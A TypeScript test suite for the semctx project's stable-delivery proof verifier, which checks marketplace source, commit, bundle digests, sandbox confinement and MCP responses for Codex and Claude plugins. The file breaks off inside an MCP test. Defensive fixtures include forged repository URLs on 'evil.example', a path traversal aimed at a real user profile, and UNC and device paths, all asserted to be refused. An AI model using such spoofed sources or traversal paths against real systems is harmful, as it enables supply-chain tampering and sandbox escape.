import { afterEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import {
  abortedProof,
  ACTIVATION_ACTION,
  admitHostPath,
  boundedCommandOutput,
  bundlesAttested,
  cliIdentityProven,
  cliSmoke,
  ConfinedAccess,
  CONTROL_STATUS_TOOL,
  defaultMcpHandshake,
  evaluatePreflight,
  defaultProofRuntime,
  environmentIsUsable,
  evaluateCliSmokeReport,
  evaluateControlStatusResponse,
  evaluateDeliveryProof,
  evaluateJsonRpcResponse,
  EXPECTED_PLUGIN_ID,
  HOST_CLI_SPECIFICATION,
  hostEnvironment,
  installCommands,
  isLocalCanonicalPath,
  isSemctxSource,
  isWithinRoot,
  MARKETPLACE_SOURCE_AUTHORITY,
  mcpWorstCaseMs,
  normaliseMarketplaceSource,
  main,
  marketplaceCommand,
  normaliseCliVersion,
  placeholderProof,
  PLUGIN_RUNTIME_BUNDLES,
  RELEASE_REF,
  PROOF_ENVIRONMENT_ALLOW_LIST,
  proofBelongsToRun,
  proofExitCode,
  PROOF_HOSTS,
  readWitness,
  releaseFromEnvironment,
  runFromEnvironment,
  runStableDeliveryProof,
  SESSION_UNKNOWN_REASON,
  STABLE_DELIVERY_PROOF_KIND,
  STABLE_DELIVERY_PROOF_SCHEMA_VERSION,
  toolchainEnvironment,
  versionFromTag,
  type CheckoutObservation,
  type DeliveryProofRuntime,
  type HostCliObservation,
  type HostObservation,
  type IsolationObservation,
  type LedgerEntry,
  type McpLimits,
  type PathAdmission,
  type ProofHost,
  type ReleaseIdentity,
  type RunIdentity,
  type StableDeliveryProof,
} from "../prove-stable-delivery";

const RELEASE: ReleaseIdentity = {
  sha: "1111111111111111111111111111111111111111",
  tag: "v1.2.3",
  version: "1.2.3",
};

const RUN: RunIdentity = {
  repository: "hoklims/semctx",
  runId: "40412",
  runAttempt: "1",
  verifierSha: "2".repeat(40),
};

const WITNESS: Record<string, string> = {
  "semctx-index-worker.js": "d".repeat(64),
  "semctx-mcp.js": "a".repeat(64),
  "semctx-shared.js": "b".repeat(64),
  "semctx.js": "c".repeat(64),
};

/** What the fake orchestration actually commits, digested the way the proof digests it. */
const WITNESS_FROM_COMMIT: Record<string, string> = Object.fromEntries(
  PLUGIN_RUNTIME_BUNDLES.map((bundle) => [bundle, sha256Hex(`committed:${bundle}`)]),
);

/**
 * Live-orchestration fixtures are *native* paths. The Codex cache entry is derived by the shared
 * delivery authority (`codexCacheEntryFromMarketplaceRoot`), which resolves against the running
 * platform — so a fixture pinned to POSIX separators would test a path shape the runner never
 * produces. The purely lexical checks below keep their explicit `"linux"` / `"win32"` platform and
 * literal strings; only the orchestration fixtures follow the host.
 */
const SANDBOX = resolve("/tmp/semctx-delivery-sandbox");
const CHECKOUT = resolve("/checkout");
const FOREIGN = resolve("/tmp/foreign-repository");
const PROOF_OUTPUT = join(resolve("/tmp/delivery-proof"), "stable-delivery-proof.json");
const MAINTAINER_HOME = resolve("/home/maintainer");
const REAL_CODEX_HOME = join(MAINTAINER_HOME, ".codex");
const REAL_CLAUDE_HOME = join(MAINTAINER_HOME, ".claude");

// The canonical layouts each host reports, mirrored from `pluginDeliveryStatus` and its fixtures.
const CODEX_MARKETPLACE_ROOT = join(SANDBOX, "codex", ".codex", ".tmp", "marketplaces", "semctx-stable");
const CODEX_CACHE_ROOT = join(SANDBOX, "codex", ".codex", "plugins", "cache", "semctx-stable", "semctx-control");
const CLAUDE_MARKETPLACE_ROOT = join(SANDBOX, "claude", ".claude", "plugins", "marketplaces", "semctx-stable");
const CLAUDE_CACHE_ROOT = join(SANDBOX, "claude", ".claude", "plugins", "cache", "semctx-stable", "semctx");

function witnesses(
  overrides: Partial<Record<ProofHost, Record<string, string | null>>> = {},
): Record<ProofHost, Record<string, string | null>> {
  return { codex: { ...WITNESS }, claude: { ...WITNESS }, ...overrides };
}

function checkout(overrides: Partial<CheckoutObservation> = {}): CheckoutObservation {
  return { path: CHECKOUT, expected: RELEASE.sha, head: RELEASE.sha, ...overrides };
}

function isolation(overrides: Partial<IsolationObservation> = {}): IsolationObservation {
  return {
    sandboxRoot: SANDBOX,
    allowedRoots: [SANDBOX, CHECKOUT, FOREIGN, PROOF_OUTPUT],
    forbiddenRoots: [REAL_CODEX_HOME, REAL_CLAUDE_HOME],
    ledger: [],
    ...overrides,
  };
}

function cli(name: ProofHost, overrides: Partial<HostCliObservation> = {}): HostCliObservation {
  const specification = HOST_CLI_SPECIFICATION[name];
  return {
    requestedPackage: specification.package,
    requestedSpecifier: specification.specifier,
    expectedVersion: specification.version,
    resolvedPackage: `${specification.package}@${specification.version}`,
    resolvedVersion: specification.version,
    resolutionQueryOk: true,
    packagePresent: true,
    rawVersion: `${name} ${specification.version}`,
    reportedVersion: specification.version,
    ...overrides,
  };
}

function host(name: ProofHost, overrides: Partial<HostObservation> = {}): HostObservation {
  return {
    host: name,
    cliAvailable: true,
    installAttempts: [],
    environmentUsable: true,
    installSucceeded: true,
    cli: cli(name),
    root: `${SANDBOX}/${name}`,
    marketplaceConfigured: true,
    marketplaceSource: "hoklims/semctx",
    marketplaceRef: "stable",
    marketplaceRoot: name === "codex" ? CODEX_MARKETPLACE_ROOT : CLAUDE_MARKETPLACE_ROOT,
    marketplaceCommit: RELEASE.sha,
    reportedVersion: RELEASE.version,
    pluginResolved: true,
    manifestVersion: RELEASE.version,
    cachePath: join(name === "codex" ? CODEX_CACHE_ROOT : CLAUDE_CACHE_ROOT, RELEASE.version),
    pathAdmissions: [],
    bundles: { ...WITNESS },
    attested: true,
    executionSnapshots: {
      cli: join(SANDBOX, "exec", `${name}-cli-token`),
      mcp: join(SANDBOX, "exec", `${name}-mcp-token`),
    },
    cliSmoke: { ran: true, ok: true, detail: "semctx.js doctor --json on a foreign repository" },
    mcpSmoke: { ran: true, ok: true, detail: "semctx-mcp.js stdio handshake from a foreign directory" },
    ...overrides,
  };
}

function proveWith(
  overrides: { codex?: Partial<HostObservation>; claude?: Partial<HostObservation> } = {},
  isolationOverrides: Partial<IsolationObservation> = {},
  release: ReleaseIdentity = RELEASE,
  witnessOverrides: Partial<Record<ProofHost, Record<string, string | null>>> = {},
) {
  return evaluateDeliveryProof({
    release,
    run: RUN,
    checkout: checkout({ expected: release.sha }),
    witnesses: witnesses(witnessOverrides),
    isolation: isolation(isolationOverrides),
    hosts: [host("codex", overrides.codex), host("claude", overrides.claude)],
    platform: process.platform,
  });
}

describe("stable delivery proof — whole evidence", () => {
  // Anti-vacuity: every hostile test below asserts a failure, so the nominal case MUST pass.
  // If this test ever fails, the whole suite becomes unfalsifiable.
  test("a complete, consistent run proves delivery on both hosts", () => {
    const proof = proveWith();
    expect(proof.reasons).toEqual([]);
    expect(proof.ok).toBe(true);
    expect(proof.stage).toBe("final");
    expect(proofExitCode(proof)).toBe(0);
    expect(proof.schemaVersion).toBe(STABLE_DELIVERY_PROOF_SCHEMA_VERSION);
    expect(proof.kind).toBe(STABLE_DELIVERY_PROOF_KIND);
    expect(proof.hosts.codex.pluginId).toBe("semctx-control@semctx-stable");
    expect(proof.hosts.claude.pluginId).toBe("semctx@semctx-stable");
  });

  test("a host whose CLI is absent from the runner fails the run rather than being skipped", () => {
    const proof = proveWith({ claude: { cliAvailable: false, installSucceeded: false } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("HOST_CLI_UNAVAILABLE");
  });

  test("a host whose official install command failed is not proven by leftover state", () => {
    const proof = proveWith({ codex: { installSucceeded: false } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("HOST_INSTALL_FAILED");
  });

  test("a host that was never exercised cannot be silently omitted", () => {
    const proof = evaluateDeliveryProof({
      release: RELEASE,
      run: RUN,
      checkout: checkout(),
      witnesses: witnesses(),
      isolation: isolation(),
      hosts: [host("codex")],
      platform: "linux",
    });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.ok).toBe(false);
    expect(proof.reasons).toContain("PLUGIN_NOT_RESOLVED");
  });

  test("the marketplace authority is exact equality after canonical normalisation", () => {
    // Accepted: every official spelling each host may report, normalised onto the two authorities.
    for (const official of [
      "hoklims/semctx",
      "https://github.com/hoklims/semctx",
      "https://github.com/hoklims/semctx.git",
      "https://github.com/hoklims/semctx/",
      "git@github.com:hoklims/semctx.git",
      "HTTPS://GitHub.com/Hoklims/Semctx.git",
      "https://token@github.com/hoklims/semctx.git",
    ]) {
      expect({ official, ok: isSemctxSource(official) }).toEqual({ official, ok: true });
    }
    // Refused: every source that merely *contains* the slug. A containment matcher passes them all.
    for (const forged of [
      "https://evil.example/hoklims/semctx.git",
      "attacker/hoklims/semctx",
      "hoklims/semctx-evil",
      "evil-hoklims/semctx",
      "git@evil.example:hoklims/semctx.git",
      "https://github.com.evil.example/hoklims/semctx",
      "",
    ]) {
      expect({ forged, ok: isSemctxSource(forged) }).toEqual({ forged, ok: false });
    }
    expect(isSemctxSource(null)).toBe(false);
    // Pin the duplicated contract until the shared delivery helper has an exported seam.
    expect(normaliseMarketplaceSource("git@github.com:hoklims/semctx.git"))
      .toBe("https://github.com/hoklims/semctx");
    expect(MARKETPLACE_SOURCE_AUTHORITY).toEqual(["hoklims/semctx", "https://github.com/hoklims/semctx"]);
  });

  test("a forged marketplace source fails the host it was reported by", () => {
    const proof = proveWith({ claude: { marketplaceSource: "https://evil.example/hoklims/semctx.git" } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("MARKETPLACE_SOURCE_MISMATCH");
  });

  test("the channel is its own authority: absent or wrong refs fail closed", () => {
    expect(RELEASE_REF).toBe("stable");
    const missing = proveWith({ codex: { marketplaceRef: null } });
    expect(missing.ok).toBe(false);
    expect(missing.hosts.codex.reasons).toContain("MARKETPLACE_REF_UNKNOWN");
    for (const wrong of ["main", "HEAD", "v1.2.3"]) {
      const proof = proveWith({ claude: { marketplaceRef: wrong } });
      expect(proof.ok).toBe(false);
      expect(proof.hosts.claude.reasons).toContain("MARKETPLACE_REF_UNEXPECTED");
    }
  });
});

describe("hostile 1 — the orchestrator never touches the maintainer's real profiles", () => {
  test("a host root pointed at the real profile is refused as unisolated", () => {
    const proof = proveWith({ codex: { root: REAL_CODEX_HOME } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("HOST_ROOT_ESCAPED_SANDBOX");
  });

  test("a single ledger entry inside a real profile fails the run", () => {
    const ledger: LedgerEntry[] = [
      { operation: "make", path: `${SANDBOX}/codex` },
      { operation: "read", path: `${REAL_CLAUDE_HOME}/plugins/config.json` },
    ];
    const proof = proveWith({}, { ledger });
    expect(proof.ok).toBe(false);
    expect(proof.isolation.reasons).toContain("PROTECTED_ROOT_TOUCHED");
    expect(proof.isolation.escaped).toHaveLength(1);
    expect(proof.isolation.escaped[0]?.path).toBe(`${REAL_CLAUDE_HOME}/plugins/config.json`);
  });

  test("a path outside every allowed root is an escape even when it is not a profile", () => {
    const ledger: LedgerEntry[] = [{ operation: "digest", path: "/opt/somewhere-else/dist/semctx.js" }];
    const proof = proveWith({}, { ledger });
    expect(proof.ok).toBe(false);
    expect(proof.isolation.reasons).toContain("LEDGER_PATH_ESCAPED");
  });

  test("an empty ledger inside the allowed roots is the nominal, provable case", () => {
    const ledger: LedgerEntry[] = [
      { operation: "make", path: `${SANDBOX}/codex` },
      { operation: "blob", path: CHECKOUT },
      { operation: "exec", path: FOREIGN },
      { operation: "write", path: PROOF_OUTPUT },
    ];
    const proof = proveWith({}, { ledger });
    expect(proof.isolation.ok).toBe(true);
    expect(proof.isolation.orchestratorPaths).toBe(4);
    expect(proof.ok).toBe(true);
  });

  test("a sandbox nested inside a forbidden root cannot vacuously satisfy confinement", () => {
    const nested = `${REAL_CODEX_HOME}/sandbox`;
    const proof = evaluateDeliveryProof({
      release: RELEASE,
      run: RUN,
      checkout: checkout(),
      witnesses: witnesses(),
      isolation: isolation({ sandboxRoot: nested, allowedRoots: [nested] }),
      hosts: [host("codex", { root: `${nested}/codex` }), host("claude", { root: `${nested}/claude` })],
      platform: "linux",
    });
    // Both host roots are "inside the sandbox", so containment alone would pass.
    expect(isWithinRoot(`${nested}/codex`, nested, "linux")).toBe(true);
    expect(proof.ok).toBe(false);
    expect(proof.isolation.reasons).toContain("HOST_ROOT_ESCAPED_SANDBOX");
  });

  test("isWithinRoot refuses a sibling that merely shares a prefix", () => {
    expect(isWithinRoot("/tmp/sandbox-evil", "/tmp/sandbox", "linux")).toBe(false);
    expect(isWithinRoot("/tmp/sandbox/codex", "/tmp/sandbox", "linux")).toBe(true);
    expect(isWithinRoot("C:\\Temp\\Box\\codex", "c:/temp/box", "win32")).toBe(true);
    expect(isWithinRoot("/tmp/BOX/codex", "/tmp/box", "linux")).toBe(false);
  });
});

describe("hostile 2 — every layer carries the same commit, not merely the same version", () => {
  test("a marketplace on another commit fails even when the version matches exactly", () => {
    const proof = proveWith({ codex: { marketplaceCommit: "2".repeat(40) } });
    expect(proof.hosts.codex.version).toBe(RELEASE.version);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("MARKETPLACE_COMMIT_MISMATCH");
  });

  test("an unknown marketplace commit is a failure, not an absence", () => {
    const proof = proveWith({ claude: { marketplaceCommit: null } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("MARKETPLACE_COMMIT_UNKNOWN");
  });

  test("a released tag whose version does not match the published version fails", () => {
    const proof = proveWith({}, {}, { sha: RELEASE.sha, tag: "v9.9.9", version: "1.2.3" });
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("RELEASE_TAG_VERSION_MISMATCH");
    expect(versionFromTag("v9.9.9")).toBe("9.9.9");
  });

  test("a bare SemVer tag is not the canonical release tag", () => {
    const proof = proveWith({}, {}, { sha: RELEASE.sha, tag: "1.2.3", version: "1.2.3" });
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("RELEASE_TAG_VERSION_MISMATCH");
  });

  test("a partial release identity never yields a proof", () => {
    const proof = proveWith({}, {}, { sha: "", tag: "v1.2.3", version: "1.2.3" });
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("RELEASE_IDENTITY_INCOMPLETE");
    expect(releaseFromEnvironment({ GITHUB_SHA: undefined, GITHUB_REF_NAME: undefined }))
      .toEqual({ sha: "", tag: "", version: "" });
  });

  test("a checkout whose head is not GITHUB_SHA cannot supply the witness", () => {
    const proof = evaluateDeliveryProof({
      release: RELEASE,
      run: RUN,
      checkout: checkout({ head: "8".repeat(40) }),
      witnesses: witnesses(),
      isolation: isolation(),
      hosts: [host("codex"), host("claude")],
      platform: "linux",
    });
    expect(proof.ok).toBe(false);
    expect(proof.checkout.ok).toBe(false);
    expect(proof.reasons).toContain("CHECKOUT_SHA_MISMATCH");
  });

  test("a checkout whose head Git would not answer is unknown, not assumed", () => {
    const proof = evaluateDeliveryProof({
      release: RELEASE,
      run: RUN,
      checkout: checkout({ head: null }),
      witnesses: witnesses(),
      isolation: isolation(),
      hosts: [host("codex"), host("claude")],
      platform: "linux",
    });
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("CHECKOUT_SHA_UNKNOWN");
  });
});

describe("hostile 3 — an installation must be whole, attested and only then executable", () => {
  test("a manifest without one of the runtime bundles fails closed", () => {
    const partial = { ...WITNESS };
    delete partial["semctx-shared.js"];
    const proof = proveWith({ codex: { bundles: partial, attested: false } });
    expect(proof.hosts.codex.reasons).toContain("BUNDLE_SET_INCOMPLETE");
    expect(proof.ok).toBe(false);
  });

  test("a present-but-undigestible bundle cannot pass as proven", () => {
    const proof = proveWith({ codex: { bundles: { ...WITNESS, "semctx.js": null }, attested: false } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("BUNDLE_DIGEST_UNKNOWN");
  });

  test("a bundle whose bytes differ from the committed witness fails", () => {
    const proof = proveWith({ claude: { bundles: { ...WITNESS, "semctx-mcp.js": "d".repeat(64) }, attested: false } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("BUNDLE_DIGEST_MISMATCH");
  });

  test("attestation is its own named gate, distinct from the digest that failed it", () => {
    expect(bundlesAttested(WITNESS, WITNESS)).toBe(true);
    expect(bundlesAttested({ ...WITNESS, "semctx.js": "0".repeat(64) }, WITNESS)).toBe(false);
    const proof = proveWith({
      codex: { attested: false, cliSmoke: { ran: false, ok: false, detail: "gated" }, mcpSmoke: { ran: false, ok: false, detail: "gated" } },
    });
    expect(proof.hosts.codex.reasons).toContain("BUNDLE_NOT_ATTESTED");
    expect(proof.hosts.codex.reasons).toContain("CLI_SMOKE_NOT_RUN");
    expect(proof.hosts.codex.reasons).toContain("MCP_SMOKE_NOT_RUN");
  });

  test("two hosts shipping different bytes for the same bundle is not one artifact", () => {
    const divergent = "e".repeat(64);
    const proof = evaluateDeliveryProof({
      release: RELEASE,
      run: RUN,
      checkout: checkout(),
      witnesses: witnesses(),
      isolation: isolation(),
      hosts: [
        host("codex", { bundles: { ...WITNESS, "semctx.js": divergent }, attested: false }),
        host("claude"),
      ],
      platform: "linux",
    });
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("HOST_ARTIFACTS_DIVERGED");
  });

  test("a plugin the host does not resolve fails even with a whole payload on disk", () => {
    const proof = proveWith({ codex: { pluginResolved: false } });
    expect(proof.hosts.codex.bundles).toEqual(WITNESS);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("PLUGIN_NOT_RESOLVED");
  });

  test("a cache manifest that disagrees with the host's reported version fails", () => {
    const proof = proveWith({ claude: { manifestVersion: "0.0.1" } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("MANIFEST_VERSION_MISMATCH");
  });

  test("a smoke that ran and failed is reported as failed, not as not-run", () => {
    const proof = proveWith({ claude: { mcpSmoke: { ran: true, ok: false, detail: "handshake refused" } } });
    expect(proof.hosts.claude.reasons).toContain("MCP_SMOKE_FAILED");
    expect(proof.hosts.claude.reasons).not.toContain("MCP_SMOKE_NOT_RUN");
  });
});

describe("hostile 4 — the witness comes from the commit, per plugin, and must agree", () => {
  test("an incomplete witness cannot license any host", () => {
    const thin = {
      "semctx-index-worker.js": WITNESS["semctx-index-worker.js"]!,
      "semctx-mcp.js": WITNESS["semctx-mcp.js"]!,
      "semctx-shared.js": null,
      "semctx.js": null,
    };
    const proof = proveWith({}, {}, RELEASE, { codex: thin });
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("WITNESS_INCOMPLETE");
  });

  test("two plugins that ship different bytes license nothing, even when both hosts agree", () => {
    const divergent = "7".repeat(64);
    const proof = evaluateDeliveryProof({
      release: RELEASE,
      run: RUN,
      checkout: checkout(),
      witnesses: { codex: { ...WITNESS }, claude: { ...WITNESS, "semctx.js": divergent } },
      isolation: isolation(),
      hosts: [host("codex"), host("claude")],
      platform: "linux",
    });
    expect(proof.reasons).not.toContain("HOST_ARTIFACTS_DIVERGED");
    expect(proof.reasons).toContain("WITNESS_DIVERGED");
    expect(proof.ok).toBe(false);
    expect(proof.witness["semctx.js"]).toBeUndefined();
  });

  test("both witnesses are archived separately, not collapsed into one", () => {
    const proof = proveWith();
    expect(Object.keys(proof.witnesses).sort()).toEqual(["claude", "codex"]);
    for (const name of PROOF_HOSTS) {
      expect(Object.keys(proof.witnesses[name]).sort()).toEqual([...PLUGIN_RUNTIME_BUNDLES].sort());
    }
  });
});

describe("hostile 5 — delivery is never reported as activation", () => {
  test("a fully proven delivery still leaves the session unproven", () => {
    const proof = proveWith();
    expect(proof.ok).toBe(true);
    expect(proof.session.proven).toBe(false);
    expect(proof.session.reason).toBe(SESSION_UNKNOWN_REASON);
  });

  test("each host carries its exact activation action even when delivery is proven", () => {
    const proof = proveWith();
    for (const name of PROOF_HOSTS) {
      expect(proof.hosts[name].activation).toBe(ACTIVATION_ACTION[name]);
      expect(proof.session.activation[name]).toBe(ACTIVATION_ACTION[name]);
    }
    expect(proof.hosts.codex.activation).toContain("new Codex task");
    expect(proof.hosts.claude.activation).toContain("/reload-plugins");
  });

  test("a failed delivery still names the activation action rather than suppressing it", () => {
    const proof = proveWith({ codex: { marketplaceCommit: null } });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.activation).toBe(ACTIVATION_ACTION.codex);
  });
});

describe("hostile 6 — the archived proof belongs to the run consuming it", () => {
  test("an internally consistent proof from another commit is refused", () => {
    const older: ReleaseIdentity = { sha: "9".repeat(40), tag: "v1.2.2", version: "1.2.2" };
    const stale = evaluateDeliveryProof({
      release: older,
      run: RUN,
      checkout: checkout({ expected: older.sha, head: older.sha }),
      witnesses: witnesses(),
      isolation: isolation(),
      hosts: [
        host("codex", { marketplaceCommit: older.sha, reportedVersion: older.version, manifestVersion: older.version }),
        host("claude", { marketplaceCommit: older.sha, reportedVersion: older.version, manifestVersion: older.version }),
      ],
      platform: "linux",
    });
    expect(stale.ok).toBe(true);
    expect(proofBelongsToRun(stale, RELEASE, RUN)).toBe(false);
    expect(proofBelongsToRun(stale, older, RUN)).toBe(true);
  });

  test("a re-run of the same tag is a different run and does not inherit its artifact", () => {
    const proof = proveWith();
    expect(proofBelongsToRun(proof, RELEASE, RUN)).toBe(true);
    expect(proofBelongsToRun(proof, RELEASE, { ...RUN, runAttempt: "2" })).toBe(false);
    expect(proofBelongsToRun(proof, RELEASE, { ...RUN, runId: "40413" })).toBe(false);
    expect(proofBelongsToRun(proof, RELEASE, { ...RUN, repository: "someone/fork" })).toBe(false);
    expect(proofBelongsToRun(proof, RELEASE, { ...RUN, verifierSha: "3".repeat(40) })).toBe(false);
  });

  test("identity is checked on commit, tag and version — not on any single field", () => {
    const proof = proveWith();
    expect(proofBelongsToRun(proof, { ...RELEASE, sha: "7".repeat(40) }, RUN)).toBe(false);
    expect(proofBelongsToRun(proof, { ...RELEASE, tag: "v1.2.4" }, RUN)).toBe(false);
    expect(proofBelongsToRun(proof, { ...RELEASE, version: "1.2.4" }, RUN)).toBe(false);
    expect(proofBelongsToRun(proof, RELEASE, RUN)).toBe(true);
  });

  test("a run identity the workflow did not supply is incomplete, not empty-but-fine", () => {
    const proof = evaluateDeliveryProof({
      release: RELEASE,
      run: { repository: "hoklims/semctx", runId: "", runAttempt: "1", verifierSha: RUN.verifierSha },
      checkout: checkout(),
      witnesses: witnesses(),
      isolation: isolation(),
      hosts: [host("codex"), host("claude")],
      platform: "linux",
    });
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("RUN_IDENTITY_INCOMPLETE");
    expect(runFromEnvironment({})).toEqual({ repository: "", runId: "", runAttempt: "", verifierSha: "" });
  });

  test("a verifier identity must be an exact commit SHA", () => {
    const proof = evaluateDeliveryProof({
      release: RELEASE,
      run: { ...RUN, verifierSha: "main" },
      checkout: checkout(),
      witnesses: witnesses(),
      isolation: isolation(),
      hosts: [host("codex"), host("claude")],
      platform: "linux",
    });
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("RUN_IDENTITY_INCOMPLETE");
  });
});

// --- Host-supplied path admission ---------------------------------------------------------------

const PATH_RUNTIME: Pick<DeliveryProofRuntime, "realPath" | "pathKind"> = {
  pathKind: () => "directory",
  realPath: (target) => target,
};

describe("hostile 7 — a path a host returns is a claim, not a location", () => {
  test("a cache outside the sandbox is refused however plausible it looks", () => {
    const admission = admitHostPath(
      "claude.cache",
      "/home/maintainer/.claude/plugins/cache/semctx-stable/semctx/1.2.3",
      "/tmp/sandbox",
      PATH_RUNTIME,
      "linux",
    );
    expect(admission.admitted).toBeNull();
    expect(admission.reason).toBe("HOST_PATH_ESCAPED_SANDBOX");
  });

  test("an escaped path is refused lexically, so the filesystem is never asked about it", () => {
    const probed: string[] = [];
    const probe: Pick<DeliveryProofRuntime, "realPath" | "pathKind"> = {
      pathKind: (target) => { probed.push(target); return "directory"; },
      realPath: (target) => { probed.push(target); return target; },
    };
    admitHostPath("claude.cache", "/home/maintainer/.claude", "/tmp/sandbox", probe, "linux");
    // Nothing under the real profile was stat'ed: refusing before touching is what keeps the
    // isolation ledger clean rather than merely well-intentioned.
    expect(probed).toEqual([]);
  });

  test("a traversal that lands back inside the sandbox is still not canonical", () => {
    const escape = "/tmp/sandbox/claude/../../../home/maintainer/.claude";
    expect(isLocalCanonicalPath(escape, "linux")).toBe(false);
    expect(admitHostPath("claude.cache", escape, "/tmp/sandbox", PATH_RUNTIME, "linux").reason)
      .toBe("HOST_PATH_NOT_ABSOLUTE");
  });

  test("UNC shares, device paths and relative fragments are all refused", () => {
    for (const hostile of ["\\\\evil\\share\\cache", "//evil/share/cache", "\\\\?\\C:\\Windows", "\\\\.\\PhysicalDrive0"]) {
      expect(isLocalCanonicalPath(hostile, "win32")).toBe(false);
    }
    expect(isLocalCanonicalPath("relative/cache", "linux")).toBe(false);
    expect(isLocalCanonicalPath("C:/sandbox/cache", "win32")).toBe(true);
    expect(isLocalCanonicalPath("/tmp/sandbox/cache", "linux")).toBe(true);
  });

  test("a POSIX backslash remains filename data, never a directory separator", () => {
    expect(isWithinRoot("/tmp/sandbox\\evil", "/tmp/sandbox", "linux")).toBe(false);
    expect(isLocalCanonicalPath("/tmp/sandbox\\evil", "linux")).toBe(true);
    const oneLongFilename = `/tmp/${Array.from({ length: 80 }, (_value, index) => `s${index}`).join("\\")}`;
    expect(isLocalCanonicalPath(oneLongFilename, "linux")).toBe(true);
    expect(isWithinRoot("C:\\sandbox\\cache", "C:\\sandbox", "win32")).toBe(true);
  });

  test("a Windows device name is a device wherever it appears in the path", () => {
    expect(isLocalCanonicalPath("C:/sandbox/NUL/cache", "win32")).toBe(false);
    expect(isLocalCanonicalPath("C:/sandbox/COM1.txt/cache", "win32")).toBe(false);
    expect(isLocalCanonicalPath("/tmp/sandbox/nul/cache", "linux")).toBe(true);
  });

  test("a control character or an unbounded path is refused rather than passed to the filesystem", () => {
    expect(isLocalCanonicalPath("/tmp/sandbox/ca\u0000che", "linux")).toBe(false);
    expect(isLocalCanonicalPath(`/tmp/sandbox/${"a".repeat(5000)}`, "linux")).toBe(false);
    expect(isLocalCanonicalPath(`/${Array.from({ length: 80 }, (_v, index) => `s${index}`).join("/")}`, "linux"))
      .toBe(false);
  });

  test("a path whose real name is not itself is an alias, and an alias is refused", () => {
    const aliased: Pick<DeliveryProofRuntime, "realPath" | "pathKind"> = {
      pathKind: () => "directory",
      realPath: () => "/home/maintainer/.claude/plugins/cache",
    };
    expect(admitHostPath("claude.cache", "/tmp/sandbox/claude/cache", "/tmp/sandbox", aliased, "linux").reason)
      .toBe("HOST_PATH_IS_LINK");
  });

  test("an absent or unreadable path is an unknown, never an empty pass", () => {
    const absent: Pick<DeliveryProofRuntime, "realPath" | "pathKind"> = {
      pathKind: () => "absent",
      realPath: () => null,
    };
    expect(admitHostPath("claude.cache", "/tmp/sandbox/claude/cache", "/tmp/sandbox", absent, "linux").reason)
      .toBe("HOST_PATH_UNREADABLE");
    expect(admitHostPath("claude.cache", null, "/tmp/sandbox", PATH_RUNTIME, "linux").reason)
      .toBe("HOST_PATH_NOT_ABSOLUTE");
  });

  test("a refused admission fails the whole host, it is not a detail of the artifact", () => {
    const proof = proveWith({
      claude: {
        pathAdmissions: [
          { label: "claude.cache", candidate: REAL_CLAUDE_HOME, admitted: null, reason: "HOST_PATH_ESCAPED_SANDBOX" },
        ],
      },
    });
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("HOST_PATH_ESCAPED_SANDBOX");
  });
});

// --- MCP protocol strictness ---------------------------------------------------------------------

const CONTROL_PAYLOAD = {
  schemaVersion: 1,
  kind: "control_freshness_status",
  basis: "control_index_snapshot_v1",
  verdict: "UNSEALED",
  canRunHighRiskControl: false,
  reasons: ["CONTROL_INDEX_MISSING"],
  freshnessSeal: null,
};

function callResponse(overrides: Record<string, unknown> = {}, id = 3): Record<string, unknown> {
  return {
    jsonrpc: "2.0",
    id,
    result: {
      content: [{ type: "text", text: JSON.stringify(CONTROL_PAYLOAD) }],
      structuredContent: CONTROL_PAYLOAD,
      ...overrides,
    },
  };
}

describe("hostile 8 — a tools/call succeeds only when the server says so and means it", () => {
  test("a well-formed control status is accepted and its verdict archived, not judged", () => {
    const verdict = evaluateControlStatusResponse(callResponse(), 3);
    expect(verdict.ok).toBe(true);
    expect(verdict.verdict).toBe("UNSEALED");
  });

  test("isError travels inside a syntactically valid result and must not read as success", () => {
    const response = callResponse({ isError: true });
    expect(evaluateJsonRpcResponse(response, 3, "tools/call").ok).toBe(true);
    const verdict = evaluateControlStatusResponse(response, 3);
    expect(verdict.ok).toBe(false);
    expect(verdict.detail).toContain("isError");
  });

  test("a malformed result is refused in each of its shapes", () => {
    const cases: Array<[string, unknown]> = [
      ["no result", { jsonrpc: "2.0", id: 3 }],
      ["array result", { jsonrpc: "2.0", id: 3, result: [] }],
      ["empty content", callResponse({ content: [], structuredContent: undefined })],
      ["non-text content", callResponse({ content: [{ type: "image" }], structuredContent: undefined })],
      ["unparseable body", { jsonrpc: "2.0", id: 3, result: { content: [{ type: "text", text: "{" }] } }],
      ["wrong envelope", { jsonrpc: "1.0", id: 3, result: { content: [] } }],
      ["not an object", "pong"],
    ];
    for (const [label, message] of cases) {
      expect({ label, ok: evaluateControlStatusResponse(message, 3).ok }).toEqual({ label, ok: false });
    }
  });

  test("a response to a different request is not this request's answer", () => {
    expect(evaluateControlStatusResponse(callResponse({}, 9), 3).ok).toBe(false);
    expect(evaluateJsonRpcResponse({ jsonrpc: "2.0", id: 9, result: {} }, 3, "tools/list").ok).toBe(false);
  });

  test("a server that answers with the wrong application payload has not proven the tool", () => {
